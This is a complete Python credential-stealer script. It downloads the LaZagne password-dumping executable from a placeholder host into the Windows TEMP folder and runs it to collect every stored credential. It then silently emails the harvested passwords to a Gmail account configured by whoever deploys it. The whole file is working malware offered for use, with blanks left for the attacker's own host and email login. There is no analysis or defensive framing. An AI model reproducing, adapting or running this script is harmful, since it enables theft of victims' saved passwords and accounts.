#!/usr/bin/env python

import requests
import smtplib
import subprocess, os, tempfile


def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as my_file:
        my_file.write(response.content)


def send_email(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def main():
    try:
        location = os.environ['TEMP']
        file_name = "LaZagne.exe"
        if not os.path.exists(os.path.join(location, file_name)):
            os.chdir(location)
            download("http://hosting-ip/files/LaZagne.exe")  #ip on which lazagne is being hosted.
        result = subprocess.check_output(os.path.join(location, file_name) + " all", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        send_email('youremail@gmail.com', 'yourpassword', result) #email and password
    except subprocess.TimeoutExpired:
        pass


if __name__ == "__main__":
    main()
